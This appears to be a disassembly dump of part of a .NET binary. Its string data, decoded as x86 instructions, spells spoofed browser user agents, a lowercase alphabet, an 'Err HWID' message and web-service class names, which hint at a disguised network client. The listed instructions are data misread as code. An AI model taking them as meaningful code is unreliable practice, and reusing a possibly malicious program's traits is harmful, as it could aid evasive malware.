  408b35:	00 20                	add    %ah,(%eax)
  408b37:	00 47 00             	add    %al,0x0(%edi)
  408b3a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408b3e:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  408b41:	00 2f                	add    %ch,(%edi)
  408b43:	00 32                	add    %dh,(%edx)
  408b45:	00 30                	add    %dh,(%eax)
  408b47:	00 31                	add    %dh,(%ecx)
  408b49:	00 30                	add    %dh,(%eax)
  408b4b:	00 30                	add    %dh,(%eax)
  408b4d:	00 31                	add    %dh,(%ecx)
  408b4f:	00 30                	add    %dh,(%eax)
  408b51:	00 31                	add    %dh,(%ecx)
  408b53:	00 20                	add    %ah,(%eax)
  408b55:	00 46 00             	add    %al,0x0(%esi)
  408b58:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  408b5e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  408b62:	78 00                	js     0x408b64
  408b64:	2f                   	das
  408b65:	00 36                	add    %dh,(%esi)
  408b67:	00 36                	add    %dh,(%esi)
  408b69:	00 2e                	add    %ch,(%esi)
  408b6b:	00 30                	add    %dh,(%eax)
  408b6d:	00 00                	add    %al,(%eax)
  408b6f:	81 13 4d 00 6f 00    	adcl   $0x6f004d,(%ebx)
  408b75:	7a 00                	jp     0x408b77
  408b77:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  408b7d:	61                   	popa
  408b7e:	00 2f                	add    %ch,(%edi)
  408b80:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  408b86:	00 20                	add    %ah,(%eax)
  408b88:	00 28                	add    %ch,(%eax)
  408b8a:	00 69 00             	add    %ch,0x0(%ecx)
  408b8d:	50                   	push   %eax
  408b8e:	00 68 00             	add    %ch,0x0(%eax)
  408b91:	6f                   	outsl  %ds:(%esi),(%dx)
  408b92:	00 6e 00             	add    %ch,0x0(%esi)
  408b95:	65 00 3b             	add    %bh,%gs:(%ebx)
  408b98:	00 20                	add    %ah,(%eax)
  408b9a:	00 43 00             	add    %al,0x0(%ebx)
  408b9d:	50                   	push   %eax
  408b9e:	00 55 00             	add    %dl,0x0(%ebp)
  408ba1:	20 00                	and    %al,(%eax)
  408ba3:	69 00 50 00 68 00    	imul   $0x680050,(%eax),%eax
  408ba9:	6f                   	outsl  %ds:(%esi),(%dx)
  408baa:	00 6e 00             	add    %ch,0x0(%esi)
  408bad:	65 00 20             	add    %ah,%gs:(%eax)
  408bb0:	00 4f 00             	add    %cl,0x0(%edi)
  408bb3:	53                   	push   %ebx
  408bb4:	00 20                	add    %ah,(%eax)
  408bb6:	00 31                	add    %dh,(%ecx)
  408bb8:	00 31                	add    %dh,(%ecx)
  408bba:	00 5f 00             	add    %bl,0x0(%edi)
  408bbd:	34 00                	xor    $0x0,%al
  408bbf:	5f                   	pop    %edi
  408bc0:	00 31                	add    %dh,(%ecx)
  408bc2:	00 20                	add    %ah,(%eax)
  408bc4:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408bc8:	00 6b 00             	add    %ch,0x0(%ebx)
  408bcb:	65 00 20             	add    %ah,%gs:(%eax)
  408bce:	00 4d 00             	add    %cl,0x0(%ebp)
  408bd1:	61                   	popa
  408bd2:	00 63 00             	add    %ah,0x0(%ebx)
  408bd5:	20 00                	and    %al,(%eax)
  408bd7:	4f                   	dec    %edi
  408bd8:	00 53 00             	add    %dl,0x0(%ebx)
  408bdb:	20 00                	and    %al,(%eax)
  408bdd:	58                   	pop    %eax
  408bde:	00 29                	add    %ch,(%ecx)
  408be0:	00 20                	add    %ah,(%eax)
  408be2:	00 41 00             	add    %al,0x0(%ecx)
  408be5:	70 00                	jo     0x408be7
  408be7:	70 00                	jo     0x408be9
  408be9:	6c                   	insb   (%dx),%es:(%edi)
  408bea:	00 65 00             	add    %ah,0x0(%ebp)
  408bed:	57                   	push   %edi
  408bee:	00 65 00             	add    %ah,0x0(%ebp)
  408bf1:	62 00                	bound  %eax,(%eax)
  408bf3:	4b                   	dec    %ebx
  408bf4:	00 69 00             	add    %ch,0x0(%ecx)
  408bf7:	74 00                	je     0x408bf9
  408bf9:	2f                   	das
  408bfa:	00 36                	add    %dh,(%esi)
  408bfc:	00 30                	add    %dh,(%eax)
  408bfe:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  408c04:	00 2e                	add    %ch,(%esi)
  408c06:	00 31                	add    %dh,(%ecx)
  408c08:	00 35 00 20 00 28    	add    %dh,0x28002000
  408c0e:	00 4b 00             	add    %cl,0x0(%ebx)
  408c11:	48                   	dec    %eax
  408c12:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  408c16:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  408c1a:	00 20                	add    %ah,(%eax)
  408c1c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408c20:	00 6b 00             	add    %ch,0x0(%ebx)
  408c23:	65 00 20             	add    %ah,%gs:(%eax)
  408c26:	00 47 00             	add    %al,0x0(%edi)
  408c29:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408c2d:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  408c30:	00 29                	add    %ch,(%ecx)
  408c32:	00 20                	add    %ah,(%eax)
  408c34:	00 56 00             	add    %dl,0x0(%esi)
  408c37:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408c3b:	73 00                	jae    0x408c3d
  408c3d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408c43:	2f                   	das
  408c44:	00 31                	add    %dh,(%ecx)
  408c46:	00 31                	add    %dh,(%ecx)
  408c48:	00 2e                	add    %ch,(%esi)
  408c4a:	00 30                	add    %dh,(%eax)
  408c4c:	00 20                	add    %ah,(%eax)
  408c4e:	00 4d 00             	add    %cl,0x0(%ebp)
  408c51:	6f                   	outsl  %ds:(%esi),(%dx)
  408c52:	00 62 00             	add    %ah,0x0(%edx)
  408c55:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  408c5b:	2f                   	das
  408c5c:	00 31                	add    %dh,(%ecx)
  408c5e:	00 35 00 45 00 31    	add    %dh,0x31004500
  408c64:	00 34 00             	add    %dh,(%eax,%eax,1)
  408c67:	38 00                	cmp    %al,(%eax)
  408c69:	20 00                	and    %al,(%eax)
  408c6b:	53                   	push   %ebx
  408c6c:	00 61 00             	add    %ah,0x0(%ecx)
  408c6f:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  408c73:	72 00                	jb     0x408c75
  408c75:	69 00 2f 00 36 00    	imul   $0x36002f,(%eax),%eax
  408c7b:	30 00                	xor    %al,(%eax)
  408c7d:	34 00                	xor    $0x0,%al
  408c7f:	2e 00 31             	add    %dh,%cs:(%ecx)
  408c82:	00 00                	add    %al,(%eax)
  408c84:	80 e7 4d             	and    $0x4d,%bh
  408c87:	00 6f 00             	add    %ch,0x0(%edi)
  408c8a:	7a 00                	jp     0x408c8c
  408c8c:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  408c92:	61                   	popa
  408c93:	00 2f                	add    %ch,(%edi)
  408c95:	00 35 00 2e 00 30    	add    %dh,0x30002e00
  408c9b:	00 20                	add    %ah,(%eax)
  408c9d:	00 28                	add    %ch,(%eax)
  408c9f:	00 57 00             	add    %dl,0x0(%edi)
  408ca2:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  408ca8:	6f                   	outsl  %ds:(%esi),(%dx)
  408ca9:	00 77 00             	add    %dh,0x0(%edi)
  408cac:	73 00                	jae    0x408cae
  408cae:	20 00                	and    %al,(%eax)
  408cb0:	4e                   	dec    %esi
  408cb1:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  408cb5:	00 31                	add    %dh,(%ecx)
  408cb7:	00 30                	add    %dh,(%eax)
  408cb9:	00 2e                	add    %ch,(%esi)
  408cbb:	00 30                	add    %dh,(%eax)
  408cbd:	00 3b                	add    %bh,(%ebx)
  408cbf:	00 20                	add    %ah,(%eax)
  408cc1:	00 57 00             	add    %dl,0x0(%edi)
  408cc4:	69 00 6e 00 36 00    	imul   $0x36006e,(%eax),%eax
  408cca:	34 00                	xor    $0x0,%al
  408ccc:	3b 00                	cmp    (%eax),%eax
  408cce:	20 00                	and    %al,(%eax)
  408cd0:	78 00                	js     0x408cd2
  408cd2:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  408cd6:	29 00                	sub    %eax,(%eax)
  408cd8:	20 00                	and    %al,(%eax)
  408cda:	41                   	inc    %ecx
  408cdb:	00 70 00             	add    %dh,0x0(%eax)
  408cde:	70 00                	jo     0x408ce0
  408ce0:	6c                   	insb   (%dx),%es:(%edi)
  408ce1:	00 65 00             	add    %ah,0x0(%ebp)
  408ce4:	57                   	push   %edi
  408ce5:	00 65 00             	add    %ah,0x0(%ebp)
  408ce8:	62 00                	bound  %eax,(%eax)
  408cea:	4b                   	dec    %ebx
  408ceb:	00 69 00             	add    %ch,0x0(%ecx)
  408cee:	74 00                	je     0x408cf0
  408cf0:	2f                   	das
  408cf1:	00 35 00 33 00 37    	add    %dh,0x37003300
  408cf7:	00 2e                	add    %ch,(%esi)
  408cf9:	00 33                	add    %dh,(%ebx)
  408cfb:	00 36                	add    %dh,(%esi)
  408cfd:	00 20                	add    %ah,(%eax)
  408cff:	00 28                	add    %ch,(%eax)
  408d01:	00 4b 00             	add    %cl,0x0(%ebx)
  408d04:	48                   	dec    %eax
  408d05:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  408d09:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  408d0d:	00 20                	add    %ah,(%eax)
  408d0f:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408d13:	00 6b 00             	add    %ch,0x0(%ebx)
  408d16:	65 00 20             	add    %ah,%gs:(%eax)
  408d19:	00 47 00             	add    %al,0x0(%edi)
  408d1c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408d20:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  408d23:	00 29                	add    %ch,(%ecx)
  408d25:	00 20                	add    %ah,(%eax)
  408d27:	00 43 00             	add    %al,0x0(%ebx)
  408d2a:	68 00 72 00 6f       	push   $0x6f007200
  408d2f:	00 6d 00             	add    %ch,0x0(%ebp)
  408d32:	65 00 2f             	add    %ch,%gs:(%edi)
  408d35:	00 36                	add    %dh,(%esi)
  408d37:	00 30                	add    %dh,(%eax)
  408d39:	00 2e                	add    %ch,(%esi)
  408d3b:	00 30                	add    %dh,(%eax)
  408d3d:	00 2e                	add    %ch,(%esi)
  408d3f:	00 33                	add    %dh,(%ebx)
  408d41:	00 31                	add    %dh,(%ecx)
  408d43:	00 31                	add    %dh,(%ecx)
  408d45:	00 32                	add    %dh,(%edx)
  408d47:	00 2e                	add    %ch,(%esi)
  408d49:	00 31                	add    %dh,(%ecx)
  408d4b:	00 31                	add    %dh,(%ecx)
  408d4d:	00 33                	add    %dh,(%ebx)
  408d4f:	00 20                	add    %ah,(%eax)
  408d51:	00 53 00             	add    %dl,0x0(%ebx)
  408d54:	61                   	popa
  408d55:	00 66 00             	add    %ah,0x0(%esi)
  408d58:	61                   	popa
  408d59:	00 72 00             	add    %dh,0x0(%edx)
  408d5c:	69 00 2f 00 35 00    	imul   $0x35002f,(%eax),%eax
  408d62:	33 00                	xor    (%eax),%eax
  408d64:	37                   	aaa
  408d65:	00 2e                	add    %ch,(%esi)
  408d67:	00 33                	add    %dh,(%ebx)
  408d69:	00 36                	add    %dh,(%esi)
  408d6b:	00 00                	add    %al,(%eax)
  408d6d:	35 61 00 62 00       	xor    $0x620061,%eax
  408d72:	63 00                	arpl   %eax,(%eax)
  408d74:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  408d78:	66 00 67 00          	data16 add %ah,0x0(%edi)
  408d7c:	68 00 69 00 6a       	push   $0x6a006900
  408d81:	00 6b 00             	add    %ch,0x0(%ebx)
  408d84:	6c                   	insb   (%dx),%es:(%edi)
  408d85:	00 6d 00             	add    %ch,0x0(%ebp)
  408d88:	6e                   	outsb  %ds:(%esi),(%dx)
  408d89:	00 6f 00             	add    %ch,0x0(%edi)
  408d8c:	70 00                	jo     0x408d8e
  408d8e:	71 00                	jno    0x408d90
  408d90:	72 00                	jb     0x408d92
  408d92:	73 00                	jae    0x408d94
  408d94:	74 00                	je     0x408d96
  408d96:	75 00                	jne    0x408d98
  408d98:	76 00                	jbe    0x408d9a
  408d9a:	77 00                	ja     0x408d9c
  408d9c:	78 00                	js     0x408d9e
  408d9e:	79 00                	jns    0x408da0
  408da0:	7a 00                	jp     0x408da2
  408da2:	00 11                	add    %dl,(%ecx)
  408da4:	45                   	inc    %ebp
  408da5:	00 72 00             	add    %dh,0x0(%edx)
  408da8:	72 00                	jb     0x408daa
  408daa:	20 00                	and    %al,(%eax)
  408dac:	48                   	dec    %eax
  408dad:	00 57 00             	add    %dl,0x0(%edi)
  408db0:	49                   	dec    %ecx
  408db1:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  408db5:	05 78 00 32 00       	add    $0x320078,%eax
  408dba:	00 09                	add    %cl,(%ecx)
  408dbc:	52                   	push   %edx
  408dbd:	00 65 00             	add    %ah,0x0(%ebp)
  408dc0:	61                   	popa
  408dc1:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  408dc5:	0b 57 00             	or     0x0(%edi),%edx
  408dc8:	72 00                	jb     0x408dca
  408dca:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  408dd0:	00 0b                	add    %cl,(%ebx)
  408dd2:	46                   	inc    %esi
  408dd3:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  408dd7:	00 73 00             	add    %dh,0x0(%ebx)
  408dda:	68 00 00 0f 54       	push   $0x540f0000
  408ddf:	00 6f 00             	add    %ch,0x0(%edi)
  408de2:	41                   	inc    %ecx
  408de3:	00 72 00             	add    %dh,0x0(%edx)
  408de6:	72 00                	jb     0x408de8
  408de8:	61                   	popa
  408de9:	00 79 00             	add    %bh,0x0(%ecx)
  408dec:	00 00                	add    %al,(%eax)
  408dee:	00 00                	add    %al,(%eax)
  408df0:	a3 10 e6 3a 7a       	mov    %eax,0x7a3ae610
  408df5:	4e                   	dec    %esi
  408df6:	fa                   	cli
  408df7:	48                   	dec    %eax
  408df8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408df9:	75 8d                	jne    0x408d88
  408dfb:	ef                   	out    %eax,(%dx)
  408dfc:	4d                   	dec    %ebp
  408dfd:	f6 1d 5d 00 08 b7    	negb   0xb708005d
  408e03:	7a 5c                	jp     0x408e61
  408e05:	56                   	push   %esi
  408e06:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  408e09:	89 08                	mov    %ecx,(%eax)
  408e0b:	b0 3f                	mov    $0x3f,%al
  408e0d:	5f                   	pop    %edi
  408e0e:	7f 11                	jg     0x408e21
  408e10:	d5 0a                	aad    $0xa
  408e12:	3a 03                	cmp    (%ebx),%al
  408e14:	20 00                	and    %al,(%eax)
  408e16:	01 03                	add    %eax,(%ebx)
  408e18:	00 00                	add    %al,(%eax)
  408e1a:	01 04 00             	add    %eax,(%eax,%eax,1)
  408e1d:	00 12                	add    %dl,(%edx)
  408e1f:	0c 07                	or     $0x7,%al
  408e21:	06                   	push   %es
  408e22:	15 12 18 01 12       	adc    $0x12011812,%eax
  408e27:	0c 04                	or     $0x4,%al
  408e29:	00 00                	add    %al,(%eax)
  408e2b:	12 08                	adc    (%eax),%cl
  408e2d:	07                   	pop    %es
  408e2e:	06                   	push   %es
  408e2f:	15 12 18 01 12       	adc    $0x12011812,%eax
  408e34:	08 04 00             	or     %al,(%eax,%eax,1)
  408e37:	00 12                	add    %dl,(%edx)
  408e39:	11 07                	adc    %eax,(%edi)
  408e3b:	06                   	push   %es
  408e3c:	15 12 18 01 12       	adc    $0x12011812,%eax
  408e41:	11 04 00             	adc    %eax,(%eax,%eax,1)
  408e44:	00 12                	add    %dl,(%edx)
  408e46:	14 07                	adc    $0x7,%al
  408e48:	06                   	push   %es
  408e49:	15 12 18 01 12       	adc    $0x12011812,%eax
  408e4e:	14 04                	adc    $0x4,%al
  408e50:	08 00                	or     %al,(%eax)
  408e52:	12 0c 04             	adc    (%esp,%eax,1),%cl
  408e55:	08 00                	or     %al,(%eax)
  408e57:	12 08                	adc    (%eax),%cl
  408e59:	04 08                	add    $0x8,%al
  408e5b:	00 12                	add    %dl,(%edx)
  408e5d:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  408e60:	00 12                	add    %dl,(%edx)
  408e62:	14 04                	adc    $0x4,%al
  408e64:	20 01                	and    %al,(%ecx)
  408e66:	02 1c 03             	add    (%ebx,%eax,1),%bl
  408e69:	20 00                	and    %al,(%eax)
  408e6b:	08 04 20             	or     %al,(%eax,%eiz,1)
  408e6e:	00 12                	add    %dl,(%edx)
  408e70:	15 03 20 00 0e       	adc    $0xe002003,%eax
  408e75:	02 1e                	add    (%esi),%bl
  408e77:	00 07                	add    %al,(%edi)
  408e79:	10 01                	adc    %al,(%ecx)
  408e7b:	01 1e                	add    %ebx,(%esi)
  408e7d:	00 1e                	add    %bl,(%esi)
  408e7f:	00 07                	add    %al,(%edi)
  408e81:	30 01                	xor    %al,(%ecx)
  408e83:	01 01                	add    %eax,(%ecx)
  408e85:	10 1e                	adc    %bl,(%esi)
  408e87:	00 02                	add    %al,(%edx)
  408e89:	13 00                	adc    (%eax),%eax
  408e8b:	04 20                	add    $0x20,%al
  408e8d:	00 13                	add    %dl,(%ebx)
  408e8f:	00 03                	add    %al,(%ebx)
  408e91:	06                   	push   %es
  408e92:	13 00                	adc    (%eax),%eax
  408e94:	04 28                	add    $0x28,%al
  408e96:	00 13                	add    %dl,(%ebx)
  408e98:	00 02                	add    %al,(%edx)
  408e9a:	06                   	push   %es
  408e9b:	0e                   	push   %cs
  408e9c:	02 06                	add    (%esi),%al
  408e9e:	08 02                	or     %al,(%edx)
  408ea0:	06                   	push   %es
  408ea1:	02 03                	add    (%ebx),%al
  408ea3:	06                   	push   %es
  408ea4:	12 19                	adc    (%ecx),%bl
  408ea6:	02 06                	add    (%esi),%al
  408ea8:	0a 03                	or     (%ebx),%al
  408eaa:	06                   	push   %es
  408eab:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  408eb0:	1d 03 06 12 21       	sbb    $0x21120603,%eax
  408eb5:	03 06                	add    (%esi),%eax
  408eb7:	12 25 02 06 1c 04    	adc    0x41c0602,%ah
  408ebd:	00 01                	add    %al,(%ecx)
  408ebf:	1c 0e                	sbb    $0xe,%al
  408ec1:	03 00                	add    (%eax),%eax
  408ec3:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  408ec6:	00 00                	add    %al,(%eax)
  408ec8:	0e                   	push   %cs
  408ec9:	05 00 01 01 12       	add    $0x12010100,%eax
  408ece:	29 05 00 01 01 1d    	sub    %eax,0x1d010100
  408ed4:	05 04 00 01 01       	add    $0x1010004,%eax
  408ed9:	0e                   	push   %cs
  408eda:	04 00                	add    $0x0,%al
  408edc:	01 01                	add    %eax,(%ecx)
  408ede:	1c 03                	sbb    $0x3,%al
  408ee0:	06                   	push   %es
  408ee1:	1d 0e 03 06 12       	sbb    $0x1206030e,%eax
  408ee6:	2d 05 00 02 01       	sub    $0x1020005,%eax
  408eeb:	0e                   	push   %cs
  408eec:	02 0b                	add    (%ebx),%cl
  408eee:	00 08                	add    %cl,(%eax)
  408ef0:	18 0e                	sbb    %cl,(%esi)
  408ef2:	08 08                	or     %cl,(%eax)
  408ef4:	08 08                	or     %cl,(%eax)
  408ef6:	08 08                	or     %cl,(%eax)
  408ef8:	08 02                	or     %al,(%edx)
  408efa:	06                   	push   %es
  408efb:	18 0a                	sbb    %cl,(%edx)
  408efd:	00 05 02 06 10 0e    	add    %al,0xe100602
  408f03:	08 10                	or     %dl,(%eax)
  408f05:	0e                   	push   %cs
  408f06:	08 03                	or     %al,(%ebx)
  408f08:	00 00                	add    %al,(%eax)
  408f0a:	02 06                	add    (%esi),%al
  408f0c:	00 02                	add    %al,(%edx)
  408f0e:	01 0e                	add    %ecx,(%esi)
  408f10:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  408f15:	1c 1d                	sbb    $0x1d,%al
  408f17:	05 07 00 03 01       	add    $0x1030007,%eax
  408f1c:	02 0e                	add    (%esi),%cl
  408f1e:	1d 05 04 00 01       	sbb    $0x1000405,%eax
  408f23:	08 08                	or     %cl,(%eax)
  408f25:	04 00                	add    $0x0,%al
  408f27:	01 02                	add    %eax,(%edx)
  408f29:	0e                   	push   %cs
  408f2a:	34 61                	xor    $0x61,%al
  408f2c:	00 62 00             	add    %ah,0x0(%edx)
  408f2f:	63 00                	arpl   %eax,(%eax)
  408f31:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  408f35:	66 00 67 00          	data16 add %ah,0x0(%edi)
  408f39:	68 00 69 00 6a       	push   $0x6a006900
  408f3e:	00 6b 00             	add    %ch,0x0(%ebx)
  408f41:	6c                   	insb   (%dx),%es:(%edi)
  408f42:	00 6d 00             	add    %ch,0x0(%ebp)
  408f45:	6e                   	outsb  %ds:(%esi),(%dx)
  408f46:	00 6f 00             	add    %ch,0x0(%edi)
  408f49:	70 00                	jo     0x408f4b
  408f4b:	71 00                	jno    0x408f4d
  408f4d:	72 00                	jb     0x408f4f
  408f4f:	73 00                	jae    0x408f51
  408f51:	74 00                	je     0x408f53
  408f53:	75 00                	jne    0x408f55
  408f55:	76 00                	jbe    0x408f57
  408f57:	77 00                	ja     0x408f59
  408f59:	78 00                	js     0x408f5b
  408f5b:	79 00                	jns    0x408f5d
  408f5d:	7a 00                	jp     0x408f5f
  408f5f:	03 06                	add    (%esi),%eax
  408f61:	12 31                	adc    (%ecx),%dh
  408f63:	04 00                	add    $0x0,%al
  408f65:	01 0e                	add    %ecx,(%esi)
  408f67:	08 06                	or     %al,(%esi)
  408f69:	00 01                	add    %al,(%ecx)
  408f6b:	02 10                	add    (%eax),%dl
  408f6d:	11 38                	adc    %edi,(%eax)
  408f6f:	03 06                	add    (%esi),%eax
  408f71:	11 38                	adc    %edi,(%eax)
  408f73:	03 00                	add    (%eax),%eax
  408f75:	00 08                	add    %cl,(%eax)
  408f77:	03 06                	add    (%esi),%eax
  408f79:	11 35 03 00 00 18    	adc    %esi,0x18000003
  408f7f:	07                   	pop    %es
  408f80:	00 03                	add    %al,(%ebx)
  408f82:	08 18                	or     %bl,(%eax)
  408f84:	12 39                	adc    (%ecx),%bh
  408f86:	08 06                	or     %al,(%esi)
  408f88:	00 01                	add    %al,(%ecx)
  408f8a:	11 3c 11             	adc    %edi,(%ecx,%edx,1)
  408f8d:	3c 05                	cmp    $0x5,%al
  408f8f:	00 01                	add    %al,(%ecx)
  408f91:	1d 05 0e 05 00       	sbb    $0x50e05,%eax
  408f96:	01 0e                	add    %ecx,(%esi)
  408f98:	1d 05 04 00 01       	sbb    $0x1000405,%eax
  408f9d:	0e                   	push   %cs
  408f9e:	0e                   	push   %cs
  408f9f:	06                   	push   %es
  408fa0:	00 02                	add    %al,(%edx)
  408fa2:	02 0e                	add    (%esi),%cl
  408fa4:	1d 05 06 00 01       	sbb    $0x1000605,%eax
  408fa9:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  408fae:	06                   	push   %es
  408faf:	12 3d 02 06 09 03    	adc    0x3090602,%bh
  408fb5:	06                   	push   %es
  408fb6:	11 3c 04             	adc    %edi,(%esp,%eax,1)
  408fb9:	00 00                	add    %al,(%eax)
  408fbb:	00 80 04 02 00 00    	add    %al,0x204(%eax)
  408fc1:	00 04 01             	add    %al,(%ecx,%eax,1)
  408fc4:	00 00                	add    %al,(%eax)
  408fc6:	00 05 20 01 01 11    	add    %al,0x11010120
  408fcc:	4d                   	dec    %ebp
  408fcd:	08 01                	or     %al,(%ecx)
  408fcf:	00 01                	add    %al,(%ecx)
  408fd1:	00 00                	add    %al,(%eax)
  408fd3:	00 00                	add    %al,(%eax)
  408fd5:	00 05 20 02 01 0e    	add    %al,0xe010220
  408fdb:	0e                   	push   %cs
  408fdc:	18 01                	sbb    %al,(%ecx)
  408fde:	00 0a                	add    %cl,(%edx)
  408fe0:	4d                   	dec    %ebp
  408fe1:	79 54                	jns    0x409037
  408fe3:	65 6d                	gs insl (%dx),%es:(%edi)
  408fe5:	70 6c                	jo     0x409053
  408fe7:	61                   	popa
  408fe8:	74 65                	je     0x40904f
  408fea:	08 31                	or     %dh,(%ecx)
  408fec:	34 2e                	xor    $0x2e,%al
  408fee:	30 2e                	xor    %ch,(%esi)
  408ff0:	30 2e                	xor    %ch,(%esi)
  408ff2:	30 00                	xor    %al,(%eax)
  408ff4:	00 06                	add    %al,(%esi)
  408ff6:	15 12 18 01 12       	adc    $0x12011812,%eax
  408ffb:	0c 06                	or     $0x6,%al
  408ffd:	15 12 18 01 12       	adc    $0x12011812,%eax
  409002:	08 06                	or     %al,(%esi)
  409004:	15 12 18 01 12       	adc    $0x12011812,%eax
  409009:	11 06                	adc    %eax,(%esi)
  40900b:	15 12 18 01 12       	adc    $0x12011812,%eax
  409010:	14 04                	adc    $0x4,%al
  409012:	07                   	pop    %es
  409013:	01 12                	add    %edx,(%edx)
  409015:	0c 04                	or     $0x4,%al
  409017:	07                   	pop    %es
  409018:	01 12                	add    %edx,(%edx)
  40901a:	08 04 07             	or     %al,(%edi,%eax,1)
  40901d:	01 12                	add    %edx,(%edx)
  40901f:	11 04 07             	adc    %eax,(%edi,%eax,1)
  409022:	01 12                	add    %edx,(%edx)
  409024:	14 04                	adc    $0x4,%al
  409026:	20 01                	and    %al,(%ecx)
  409028:	01 0e                	add    %ecx,(%esi)
  40902a:	0c 01                	or     $0x1,%al
  40902c:	00 07                	add    %al,(%edi)
  40902e:	4d                   	dec    %ebp
  40902f:	79 2e                	jns    0x40905f
  409031:	55                   	push   %ebp
  409032:	73 65                	jae    0x409099
  409034:	72 00                	jb     0x409036
  409036:	00 13                	add    %dl,(%ebx)
  409038:	01 00                	add    %eax,(%eax)
  40903a:	0e                   	push   %cs
  40903b:	4d                   	dec    %ebp
  40903c:	79 2e                	jns    0x40906c
  40903e:	57                   	push   %edi
  40903f:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  409043:	72 76                	jb     0x4090bb
  409045:	69 63 65 73 00 00 10 	imul   $0x10000073,0x65(%ebx),%esp
  40904c:	01 00                	add    %eax,(%eax)
  40904e:	0b 4d 79             	or     0x79(%ebp),%ecx
  409051:	2e 43                	cs inc %ebx
  409053:	6f                   	outsl  %ds:(%esi),(%dx)
  409054:	6d                   	insl   (%dx),%es:(%edi)
  409055:	70 75                	jo     0x4090cc
  409057:	74 65                	je     0x4090be
  409059:	72 00                	jb     0x40905b
  40905b:	00 13                	add    %dl,(%ebx)
  40905d:	01 00                	add    %eax,(%eax)
  40905f:	0e                   	push   %cs
  409060:	4d                   	dec    %ebp
  409061:	79 2e                	jns    0x409091
  409063:	41                   	inc    %ecx
  409064:	70 70                	jo     0x4090d6
  409066:	6c                   	insb   (%dx),%es:(%edi)
  409067:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40906e:	00 00                	add    %al,(%eax)
  409070:	04 00                	add    $0x0,%al
  409072:	01 1c 1c             	add    %ebx,(%esp,%ebx,1)
  409075:	03 07                	add    (%edi),%eax
  409077:	01 02                	add    %eax,(%edx)
  409079:	03 07                	add    (%edi),%eax
  40907b:	01 08                	add    %ecx,(%eax)
  40907d:	06                   	push   %es
  40907e:	00 01                	add    %al,(%ecx)
  409080:	12 15 11 69 04 07    	adc    0x7046911,%dl
  409086:	01 12                	add    %edx,(%edx)
  409088:	15 03 07 01 0e       	adc    $0xe010703,%eax
  40908d:	05 10 01 00 1e       	add    $0x1e000110,%eax
  409092:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409095:	01 1e                	add    %ebx,(%esi)
  409097:	00 04 07             	add    %al,(%edi,%eax,1)
  40909a:	01 1e                	add    %ebx,(%esi)
  40909c:	00 07                	add    %al,(%edi)
  40909e:	20 04 01             	and    %al,(%ecx,%eax,1)
  4090a1:	0e                   	push   %cs
  4090a2:	0e                   	push   %cs
  4090a3:	0e                   	push   %cs
  4090a4:	0e                   	push   %cs
  4090a5:	61                   	popa
  4090a6:	01 00                	add    %eax,(%eax)
  4090a8:	34 53                	xor    $0x53,%al
  4090aa:	79 73                	jns    0x40911f
  4090ac:	74 65                	je     0x409113
  4090ae:	6d                   	insl   (%dx),%es:(%edi)
  4090af:	2e 57                	cs push %edi
  4090b1:	65 62 2e             	bound  %ebp,%gs:(%esi)
  4090b4:	53                   	push   %ebx
  4090b5:	65 72 76             	gs jb  0x40912e
  4090b8:	69 63 65 73 2e 50 72 	imul   $0x72502e73,0x65(%ebx),%esp
  4090bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c0:	74 6f                	je     0x409131
  4090c2:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4090c5:	73 2e                	jae    0x4090f5
  4090c7:	53                   	push   %ebx
  4090c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c9:	61                   	popa
  4090ca:	70 48                	jo     0x409114
  4090cc:	74 74                	je     0x409142
  4090ce:	70 43                	jo     0x409113
  4090d0:	6c                   	insb   (%dx),%es:(%edi)
  4090d1:	69 65 6e 74 50 72 6f 	imul   $0x6f725074,0x6e(%ebp),%esp
  4090d8:	74 6f                	je     0x409149
  4090da:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4090dd:	12 43 72             	adc    0x72(%ebx),%al
  4090e0:	65 61                	gs popa
  4090e2:	74 65                	je     0x409149
  4090e4:	5f                   	pop    %edi
